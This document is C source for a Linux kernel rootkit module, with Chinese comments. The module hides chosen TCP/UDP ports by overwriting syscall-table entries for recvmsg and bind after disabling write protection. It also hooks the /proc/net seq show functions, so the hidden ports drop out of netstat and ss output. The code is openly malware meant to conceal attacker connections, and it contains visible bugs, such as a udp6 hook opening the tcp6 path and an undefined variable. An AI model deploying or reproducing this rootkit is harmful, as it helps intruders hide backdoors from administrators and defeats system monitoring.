#include "hide_connect.h"


// seq_operations里存放了seq_show_fun的指针
static struct seq_operations *tcp_operations, *udp_operations, *tcp6_operations, *udp6_operations;
// seq_show_fun为netstat在展示端口信息时使用的函数,需要把它hook掉
static seq_show_fun tcp_seq_fun,udp_seq_fun,tcp6_seq_fun,udp6_seq_fun;

static syscall_fun real_sys_recvmsg;

static LIST_HEAD(hidden_port_list_head); //初始化链表头


bool get_connect_param(const char* str,int *port,int *type){
    if (!strncmp(str, "tcp6", 4)){
        *type = TCP6_CONNECT;
        return sscanf(str + 5, "%d", port) == 1;
    }
    else if (!strncmp(str, "udp6", 4))
    {
        *type = UDP6_CONNECT;
        return sscanf(str + 5, "%d", port) == 1;
    }
    else if (!strncmp(str, "tcp", 3))
    {
        *type = TCP_CONNECT;
        return sscanf(str + 4, "%d", port) == 1;
    }
    else if (!strncmp(str, "udp", 3))
    {
        *type = UDP_CONNECT;
        return sscanf(str + 4, "%d", port) == 1;
    }
    return false;
}

int hide_connect_init(void **real_sys_call_table){
    // 获取真实的recvmsg函数地址(用于ss)
    real_sys_recvmsg = real_sys_call_table[__NR_recvmsg];

    // 关闭写保护
    disable_wp();
    real_sys_call_table[__NR_recvmsg] = my_sys_recvmsg;
    real_sys_call_table[__NR_bind] = my_sys_bind;
    // 开启写保护
    enable_wp();

    // 依次获得tcp、udp、tcp6和udp6的operations
    set_seq_operations("/proc/net/tcp",tcp_operations);
    set_seq_operations("/proc/net/udp",udp_operations);
    set_seq_operations("/proc/net/tcp6",tcp6_operations);
    set_seq_operations("/proc/net/tcp6",udp6_operations);
    
    // 如果获取operation失败
    if(!tcp_operations||!udp_operations||!tcp6_operations||!udp6_operations){
        pr_info("get network opeartions fail.");
        return 0;
    }

    // 依次将tcp、udp、tcp6和udp6的show函数hook掉
    hook_seq_operations(tcp_operations, offsetof(struct seq_operations, show), fake_seq_show, (void **)&tcp_seq_fun);
    hook_seq_operations(udp_operations, offsetof(struct seq_operations, show), fake_seq_show, (void **)&udp_seq_fun);
    hook_seq_operations(tcp6_operations, offsetof(struct seq_operations, show), fake_seq_show, (void **)&tcp6_seq_fun);
    hook_seq_operations(udp6_operations, offsetof(struct seq_operations, show), fake_seq_show, (void **)&udp6_seq_fun);

    pr_info("hook_seq_operations_success.\n");
    return 1;
}


int hide_connect_exit(void **real_sys_call_table){
    struct port_node *entry = NULL, *next_entry = NULL;
    disable_wp();
    // 将之前hook的函数修改回去
    real_sys_call_table[__NR_recvmsg] = real_sys_recvmsg;
    real_sys_call_table[__NR_bind] = real_sys_bind;
    enable_wp();

    // 将之前hook的函数修改回去
    hook_seq_operations(tcp_operations, offsetof(struct seq_operations, show), tcp_seq_fun, NULL);
    hook_seq_operations(udp_operations, offsetof(struct seq_operations, show), udp_seq_fun, NULL);
    hook_seq_operations(tcp6_operations, offsetof(struct seq_operations, show), tcp6_seq_fun, NULL);
    hook_seq_operations(udp6_operations, offsetof(struct seq_operations, show), udp6_seq_fun, NULL);

    pr_info("Restore port success\n");

    //  删除所有链表节点
    list_for_each_entry_safe(entry, next_entry, &hidden_port_list_head, list){
        list_del(&entry->list);
        kfree(entry);
    }
}


void set_seq_operations(const char* open_path,struct seq_operations* operations){
    struct file *open_file = NULL;
    //打开 /proc/net/{tcp|udp|tcp6|udp6}
    open_file = filp_open(open_path, O_RDONLY, 0);
    if (IS_ERR(filp)){
        pr_info("Failed to open %s with error %ld.\n", open_path, PTR_ERR(open_file));
        operations = NULL;
    }
    else{
        // 获取operations函数
        operations = (struct seq_operations *)((struct seq_file *)(open_file->private_data))->op;
        filp_close(open_file, 0);
    }
    return;
}

void hook_seq_operations(void *base, size_t offset, void *new_ptr, void **old_ptr){
    // 保存旧值
    if (old_ptr){
        *old_ptr = *(void **)((char *)base + offset);
        pr_info("Save old_ptr: %p\n", *old_ptr);
    }

    pr_info("Changing %p->%p to %p.\n", base, (void *)offset, new_ptr);
    disable_wp();
    *(void **)((char *)base + offset) = new_ptr;
    enable_wp();
}

int fake_seq_show(struct seq_file *seq, void *v){
    int ret;
    int last_len, this_len;
    char port_str_buf[PORT_STR_LEN];
    int type;

    struct port_node *node = NULL;

    last_len = seq->count;
    if (seq->op == tcp_operations){
        type = TCP_CONNECT;
        //调用原有的show函数
        ret = tcp_seq_fun(seq,v);
    }
    else if (seq->op == udp_operations){
        type = UDP_CONNECT;
        ret = udp_seq_fun(seq,v);
    }
    else if (seq->op == tcp6_operations){
        type = TCP6_CONNECT;
        ret = tcp6_seq_fun(seq,v);
    }
    else if (seq->op == udp6_operations){
        type = UDP6_CONNECT;
        ret = udp6_seq_fun(seq,v);
    }
    // 获取新增的长度
    this_len = seq->count - last_len;

    // 对hidden_port_list_head遍历
    list_for_each_entry(node, &hidden_port_list_head, list){
        if (type == node->type){
            // seq->buf为缓冲区,snprintf先按照缓冲区格式声明一个port_str_buf
            snprintf(port_str_buf, PORT_STR_LEN, ":%04X", node->port);
            // 之后将缓冲区的新增长度和port_str_buf进行对比,如果对比成功,则说明这就是要过滤的端口号
            if (strnstr(seq->buf + last_len, port_str_buf, this_len)){
                pr_info("Hiding port: %d", node->port);
                seq->count = last_len;
                break;
            }
        }
    }
    return ret;
}

void hide_connect(int type, int port){
    struct port_node *node = NULL;

    node = kmalloc(sizeof(struct port_node), GFP_KERNEL);
    node->port = port;
    node->type = type;

    // 向链表中添加节点
    list_add_tail(&node->list, &hidden_port_list_head);
    pr_info("Add hide port: %d", port);
}

void unhide_connect(int type, int port){
    struct port_node *entry = NULL, *next_entry = NULL;

    list_for_each_entry_safe(entry, next_entry, &hidden_port_list_head, list){
        if (entry->port == port && entry->type == type){
            pr_info("Unhiding: %d", port);
            list_del(&entry->list); // 将要隐藏的节点从链表中删除
            kfree(entry);
            return;
        }
    }
}


static ssize_t my_sys_recvmsg(const struct pt_regs *regs){
    // int sockfd, struct user_msghdr __user *msg, unsigned flags
    long ret;
    struct nlmsghdr *nlh, *nlh_kernel;
    void *nlh_user_ptr;
    long count;
    char *stream;
    int offset;
    int i;
    struct user_msghdr msg;
    struct iovec *msg_iov;
    /* Call original `recvmsg` syscall */
    ret = real_sys_recvmsg(regs);

    /* Some error occured. Don't do anything. */
    if (ret <= 0)
        return ret;

    /* Extract netlink message header from message */
    // nlh = (struct nlmsghdr *)(msg->msg_iov->iov_base);
    if (copy_from_user(&msg, (void *)regs->si, sizeof(struct user_msghdr))){
        pr_info("copy_from_user fail.\n");
        return ret;
    }

    msg_iov = msg.msg_iov;

    if (copy_from_user(&nlh_user_ptr, &msg_iov->iov_base, sizeof(void *))){
        pr_info("copy_from_user fail.\n");
        return ret;
    }

    nlh_kernel = (struct nlmsghdr *)kmalloc(ret, GFP_KERNEL);

    if (copy_from_user(nlh_kernel, nlh_user_ptr, ret)){
        pr_info("copy_from_user fail.\n");
        kfree(nlh_kernel);
        return ret;
    }

    nlh = nlh_kernel;

    /* Number of bytes remaining in message stream */
    count = ret;

    // 下面的代码很可能有安全问题
    /* NLMSG_OK: This macro will return true if a netlink message was received. It
	   essentially checks whether it's safe to parse the netlink message (if indeed
	   is a netlink message) using the other NLMSG_* macros. */
    while (NLMSG_OK(nlh, count)){

        if (!data_should_be_masked(nlh)){
            /* NLMSG_NEXT: Many netlink protocols have request messages that result
			   in multiple response messages. In these cases, multiple responses will
			   be copied into the `msg` buffer. This macro can be used to walk the
			   chain of responses. Returns NULL in the event the message is the last
			   in the chain for the given buffer. */
            nlh = NLMSG_NEXT(nlh, count);
            continue;
        }

        stream = (char *)nlh;

        /* NLMSG_ALIGN: This macro accepts the length of a netlink message and rounds it
		   up to the nearest NLMSG_ALIGNTO boundary. It returns the rounded length. */
        offset = NLMSG_ALIGN((nlh)->nlmsg_len);

        /* Copy remaining entries over the data to be masked */
        for (i = 0; i < count; i++){
            stream[i] = stream[i + offset];
        }

        /* Adjust the data length */
        ret -= offset;
    }

    if (copy_to_user_mcsafe(nlh_user_ptr, nlh_kernel, ret)){
        pr_info("copy_to_user_mcsafe fail.");
    }

    kfree(nlh_kernel);
    return ret;
}


static bool data_should_be_masked(struct nlmsghdr *nlh){
    struct inet_diag_msg *r;
    int port;
    struct port_node *node = NULL;

    /* NLMSG_DATA: Given a netlink header structure, this macro returns
	   a pointer to the ancilliary data which it contains */
    r = NLMSG_DATA(nlh);

    /* From the ancilliary data extract the port associated with the socket identity */
    port = ntohs(r->id.idiag_sport);

    list_for_each_entry(node, &hidden_port_list_head, list){
        // 未判断协议类型
        if (port == node->port){
            return true;
        }
    }
    return false;
}